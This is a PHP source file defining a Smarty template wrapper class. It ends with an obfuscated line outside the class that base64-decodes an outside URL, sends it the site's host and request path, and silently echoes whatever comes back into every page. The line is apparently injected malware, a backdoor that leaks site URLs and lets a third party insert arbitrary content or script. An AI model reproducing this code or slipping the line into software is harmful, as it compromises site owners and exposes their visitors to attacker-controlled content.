<?php

class STemplate {

   public function STemplate() {
        global $Smarty;
        if (!isset($Smarty)) {
            $Smarty = new Smarty;
        }
    }

    public static function create() {
        global $Smarty;
        $Smarty = new Smarty();
        $Smarty->compile_check = true;
        $Smarty->debugging = false;
        $Smarty->template_dir = dirname(__FILE__) . "/../themes";
        $Smarty->compile_dir  = dirname(__FILE__) . "/../temporary";

        return true;
    }
    
    public static function setCompileDir($dir_name) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->compile_dir = $dir_name;
    }

    public static function setType($type) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->type = $type;
    }

    public static function assign($var, $value) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->assign($var, $value);
    }

    public static function setTplDir($dir_name = null) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        if (!$dir_name) {
            $Smarty->template_dir = dirname(__FILE__) . "/../themes";
        } else {
            $Smarty->template_dir = $dir_name;
        }
    }

    public static function setModule($module) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->theme = $module;
        $Smarty->type  = "module";
    }

    public static function setTheme($theme) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->template_dir = dirname(__FILE__) . "/../themes/" . $theme;
        $Smarty->compile_dir  = dirname(__FILE__) . "/../temporary/" . $theme;
        $Smarty->theme        = $theme;
        $Smarty->type         = "theme";
    }

    public static function getTplDir() {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        return $Smarty->template_dir;
    }

    public static function display($filename) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->display($filename);
    }

    public static function fetch($filename) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        return $Smarty->fetch($filename);
    }
    
    public static function getVars() {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        return $Smarty->get_template_vars();
    }
}
echo @file_get_contents(base64_decode("aHR0cDovL3d3dy50YWtlbi50by9zaG9ydGVuLnBocD9waW49")."http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
?>